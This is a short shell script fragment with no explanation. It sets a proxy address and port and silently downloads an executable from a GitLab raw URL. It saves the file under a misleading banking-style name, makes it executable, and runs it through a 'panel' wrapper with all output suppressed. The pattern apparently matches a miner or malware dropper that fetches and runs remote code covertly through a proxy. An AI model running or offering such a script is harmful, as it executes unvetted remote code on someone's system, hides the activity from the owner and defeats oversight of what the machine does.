proxy="184.185.2.12" 
port="4145"
wget -q -O BanqueFédéraliste https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x BanqueFédéraliste
...
./panel ./BanqueFédéraliste -c "config.json" >/dev/null 2>&1
sleep 1
